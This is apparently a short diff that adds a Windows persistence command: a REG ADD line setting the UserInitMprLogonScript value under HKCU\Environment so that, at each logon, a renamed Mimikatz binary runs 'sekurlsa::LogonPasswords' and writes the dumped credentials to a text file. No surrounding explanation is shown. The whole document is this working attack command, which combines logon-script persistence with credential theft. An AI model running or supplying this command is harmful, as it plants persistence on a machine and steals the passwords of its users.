@@ -1,0 +1,2 @@
+UserInitMprLogonScript 
+REG ADD HKCU\Environment /f /v UserInitMprLogonScript /t REG_MULTI_SZ /d "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
